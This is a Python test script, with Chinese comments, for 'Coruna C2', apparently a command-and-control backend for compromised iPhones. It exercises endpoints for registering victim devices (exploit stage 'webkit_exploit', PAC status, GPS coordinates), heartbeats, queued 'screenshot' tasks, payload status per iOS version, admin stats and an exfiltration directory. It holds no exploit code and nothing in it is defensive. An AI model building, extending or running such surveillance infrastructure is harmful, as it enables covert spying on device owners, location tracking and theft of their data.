#!/usr/bin/env python3
"""
Coruna C2 系统测试脚本
测试各个 API 端点和功能
"""

import sys
import os
import json
import requests
import time
from pathlib import Path

# 添加 backend 目录到 Python 路径
sys.path.insert(0, str(Path(__file__).parent / "backend"))

from backend.config import get_config

config = get_config()
BASE_URL = f"http://{config.HOST}:{config.PORT}"


class Colors:
    """终端颜色"""
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'


def print_success(message):
    print(f"{Colors.GREEN}✓{Colors.END} {message}")


def print_error(message):
    print(f"{Colors.RED}✗{Colors.END} {message}")


def print_info(message):
    print(f"{Colors.BLUE}ℹ{Colors.END} {message}")


def print_warning(message):
    print(f"{Colors.YELLOW}⚠{Colors.END} {message}")


def test_server_health():
    """测试服务器健康状态"""
    print_info("Testing server health...")
    try:
        response = requests.get(f"{BASE_URL}/health", timeout=5)
        if response.status_code == 200:
            data = response.json()
            print_success(f"Server is healthy: {data['server']} v{data['version']}")
            return True
        else:
            print_error(f"Server health check failed: {response.status_code}")
            return False
    except Exception as e:
        print_error(f"Cannot connect to server: {e}")
        return False


def test_server_info():
    """测试服务器信息"""
    print_info("Testing server info...")
    try:
        response = requests.get(f"{BASE_URL}/api/info", timeout=5)
        if response.status_code == 200:
            data = response.json()
            print_success(f"Server info retrieved")
            print(f"  - Supported iOS versions: {len(data['supported_ios_versions'])}")
            print(f"  - Exploit stages: {len(data['exploit_stages'])}")
            print(f"  - Task types: {len(data['task_types'])}")
            return True
        else:
            print_error(f"Server info request failed: {response.status_code}")
            return False
    except Exception as e:
        print_error(f"Server info request error: {e}")
        return False


def test_admin_login():
    """测试管理员登录"""
    print_info("Testing admin login...")
    try:
        response = requests.post(
            f"{BASE_URL}/api/admin/login",
            data={
                "username": config.ADMIN_USER,
                "password": config.ADMIN_PASS
            },
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            token = data.get('access_token')
            print_success("Admin login successful")
            return token
        else:
            print_error(f"Admin login failed: {response.status_code}")
            return None
    except Exception as e:
        print_error(f"Admin login error: {e}")
        return None


def test_device_registration():
    """测试设备注册"""
    print_info("Testing device registration...")
    try:
        import uuid
        device_uuid = str(uuid.uuid4())
        
        device_data = {
            "device_uuid": device_uuid,
            "device_model": "iPhone 12",
            "ios_version": "14.5",
            "chipset": "A14",
            "exploit_stage": "webkit_exploit",
            "runtime_type": "javascriptcore",
            "has_pac": True,
            "pac_integrity": True,
            "latitude": 39.9042,
            "longitude": 116.4074
        }
        
        response = requests.post(
            f"{BASE_URL}/api/devices/register",
            json=device_data,
            timeout=5
        )
        
        if response.status_code == 200:
            print_success(f"Device registered: {device_uuid}")
            return device_uuid
        else:
            print_error(f"Device registration failed: {response.status_code}")
            return None
    except Exception as e:
        print_error(f"Device registration error: {e}")
        return None


def test_device_heartbeat(device_uuid):
    """测试设备心跳"""
    print_info("Testing device heartbeat...")
    try:
        heartbeat_data = {
            "device_uuid": device_uuid,
            "status": "online",
            "battery_level": 85,
            "exploit_stage": "completed"
        }
        
        response = requests.post(
            f"{BASE_URL}/api/devices/heartbeat",
            json=heartbeat_data,
            timeout=5
        )
        
        if response.status_code == 200:
            print_success("Device heartbeat successful")
            return True
        else:
            print_error(f"Device heartbeat failed: {response.status_code}")
            return False
    except Exception as e:
        print_error(f"Device heartbeat error: {e}")
        return False


def test_task_creation(device_uuid, admin_token):
    """测试任务创建"""
    print_info("Testing task creation...")
    try:
        task_data = {
            "device_uuid": device_uuid,
            "task_type": "screenshot",
            "payload": "",
            "priority": 1
        }
        
        headers = {
            "Authorization": f"Bearer {admin_token}"
        }
        
        response = requests.post(
            f"{BASE_URL}/api/tasks/create",
            json=task_data,
            headers=headers,
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            task_id = data.get('id')
            print_success(f"Task created: ID {task_id}")
            return task_id
        else:
            print_error(f"Task creation failed: {response.status_code}")
            return None
    except Exception as e:
        print_error(f"Task creation error: {e}")
        return None


def test_task_polling(device_uuid):
    """测试任务轮询"""
    print_info("Testing task polling...")
    try:
        response = requests.get(
            f"{BASE_URL}/api/tasks/poll/{device_uuid}",
            timeout=5
        )
        
        if response.status_code == 200:
            tasks = response.json()
            print_success(f"Task polling successful: {len(tasks)} tasks")
            return tasks
        else:
            print_error(f"Task polling failed: {response.status_code}")
            return None
    except Exception as e:
        print_error(f"Task polling error: {e}")
        return None


def test_admin_stats(admin_token):
    """测试管理员统计"""
    print_info("Testing admin stats...")
    try:
        headers = {
            "Authorization": f"Bearer {admin_token}"
        }
        
        response = requests.get(
            f"{BASE_URL}/api/admin/stats",
            headers=headers,
            timeout=5
        )
        
        if response.status_code == 200:
            stats = response.json()
            print_success("Admin stats retrieved")
            print(f"  - Total devices: {stats['total_devices']}")
            print(f"  - Online devices: {stats['online_devices']}")
            print(f"  - Total tasks: {stats['total_tasks']}")
            print(f"  - Pending tasks: {stats['pending_tasks']}")
            return True
        else:
            print_error(f"Admin stats failed: {response.status_code}")
            return False
    except Exception as e:
        print_error(f"Admin stats error: {e}")
        return False


def test_payload_status():
    """测试 Payload 状态"""
    print_info("Testing payload status...")
    try:
        response = requests.get(
            f"{BASE_URL}/api/payloads/status",
            timeout=5
        )
        
        if response.status_code == 200:
            data = response.json()
            print_success("Payload status retrieved")
            print(f"  - iOS versions checked: {len(data['status'])}")
            return True
        else:
            print_error(f"Payload status failed: {response.status_code}")
            return False
    except Exception as e:
        print_error(f"Payload status error: {e}")
        return False


def test_database():
    """测试数据库连接"""
    print_info("Testing database connection...")
    try:
        from backend.database import engine, Base
        
        # 测试连接
        with engine.connect() as conn:
            conn.execute("SELECT 1")
        
        print_success("Database connection successful")
        
        # 检查表是否存在
        inspector = __import__('sqlalchemy').inspect(engine)
        tables = inspector.get_table_names()
        print_success(f"Database tables: {len(tables)} tables found")
        
        return True
    except Exception as e:
        print_error(f"Database connection error: {e}")
        return False


def test_filesystem():
    """测试文件系统"""
    print_info("Testing filesystem...")
    try:
        # 检查必要目录
        dirs_to_check = [
            config.EXFIL_DIR,
            config.LOG_DIR,
            config.PAYLOAD_DIR
        ]
        
        all_exist = True
        for dir_path in dirs_to_check:
            if dir_path.exists():
                print_success(f"Directory exists: {dir_path.name}")
            else:
                print_error(f"Directory missing: {dir_path.name}")
                all_exist = False
        
        if all_exist:
            print_success("All required directories exist")
            return True
        else:
            return False
    except Exception as e:
        print_error(f"Filesystem test error: {e}")
        return False


def run_all_tests():
    """运行所有测试"""
    print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}Coruna C2 System Test{Colors.END}")
    print(f"{Colors.BOLD}{'='*60}{Colors.END}\n")
    
    results = []
    
    # 基础测试
    print(f"{Colors.BOLD}=== Basic Tests ==={Colors.END}\n")
    results.append(("Database", test_database()))
    results.append(("Filesystem", test_filesystem()))
    results.append(("Server Health", test_server_health()))
    results.append(("Server Info", test_server_info()))
    
    if not results[-1][1]:  # 如果服务器健康检查失败，停止测试
        print_error("Server is not running. Please start the server first.")
        return
    
    # 认证测试
    print(f"\n{Colors.BOLD}=== Authentication Tests ==={Colors.END}\n")
    admin_token = test_admin_login()
    results.append(("Admin Login", admin_token is not None))
    
    # 设备测试
    print(f"\n{Colors.BOLD}=== Device Tests ==={Colors.END}\n")
    device_uuid = test_device_registration()
    results.append(("Device Registration", device_uuid is not None))
    
    if device_uuid:
        results.append(("Device Heartbeat", test_device_heartbeat(device_uuid)))
        
        # 任务测试
        print(f"\n{Colors.BOLD}=== Task Tests ==={Colors.END}\n")
        task_id = test_task_creation(device_uuid, admin_token)
        results.append(("Task Creation", task_id is not None))
        
        if task_id:
            results.append(("Task Polling", test_task_polling(device_uuid) is not None))
    
    # 管理员测试
    print(f"\n{Colors.BOLD}=== Admin Tests ==={Colors.END}\n")
    if admin_token:
        results.append(("Admin Stats", test_admin_stats(admin_token)))
    
    # Payload 测试
    print(f"\n{Colors.BOLD}=== Payload Tests ==={Colors.END}\n")
    results.append(("Payload Status", test_payload_status()))
    
    # 总结
    print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}Test Summary{Colors.END}")
    print(f"{Colors.BOLD}{'='*60}{Colors.END}\n")
    
    passed = sum(1 for _, result in results if result)
    total = len(results)
    
    for test_name, result in results:
        status = f"{Colors.GREEN}PASS{Colors.END}" if result else f"{Colors.RED}FAIL{Colors.END}"
        print(f"{test_name:.<40} {status}")
    
    print(f"\n{Colors.BOLD}Total: {passed}/{total} tests passed{Colors.END}\n")
    
    if passed == total:
        print_success("All tests passed! 🎉")
        return 0
    else:
        print_error(f"{total - passed} test(s) failed")
        return 1


if __name__ == "__main__":
    sys.exit(run_all_tests())